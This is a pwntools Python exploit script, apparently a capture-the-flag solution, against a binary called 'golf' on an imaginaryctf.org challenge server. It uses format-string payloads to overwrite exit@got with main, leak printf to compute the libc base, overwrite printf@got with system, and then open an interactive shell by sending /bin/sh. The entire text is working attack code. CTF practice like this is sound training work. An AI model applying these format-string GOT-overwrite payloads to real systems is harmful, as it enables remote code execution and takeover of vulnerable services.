#!/usr/bin/python3

from pwn import *

exe = ELF('./golf_patched', checksec=False)
libc = ELF('./libc6_2.31-0ubuntu9.8_amd64.so', checksec=False)
context.binary = exe
context.log_level = 'info'

while True:
	# p = process(exe.path)
	p = remote('golf.chal.imaginaryctf.org', 1337)

	###########################################
	### Stage 1: Overwrite exit@got to main ###
	###########################################
	payload = b'%*8$c%9$nA' + b'\x00'
	payload = payload.ljust(0x10, b'P')
	payload += flat(exe.sym['main'], exe.got['exit'])
	p.sendline(payload)
	p.recvuntil(b'A')

	##################################
	### Stage 2: Leak libc address ###
	##################################
	payload = b'%8$sB' + b'\x00'
	payload = payload.ljust(0x10, b'P')
	payload += flat(exe.got['printf'])
	p.sendline(payload)

	try:
		printf_addr = u64(p.recvuntil(b'B', drop=True)[-6:] + b'\x00\x00')
	except:
		p.close()
		continue
	libc.address = printf_addr - libc.sym['printf']
	log.info(hex(printf_addr))
	log.info(hex(libc.address))

	if ((libc.address >> 24) & 0xff) < 0x5:
		break
	libc.address = 0
	p.close()

###############################################
### Stage 3: Overwrite printf@got to system ###
###############################################
payload = b'%*8$c%9$nC' + b'\x00'
payload = payload.ljust(0x10, b'P')
payload += flat(libc.sym['system'], exe.got['printf'])
p.sendline(payload)
p.recvuntil(b'C')

# Get shell
p.sendline(b'/bin/sh')

p.interactive()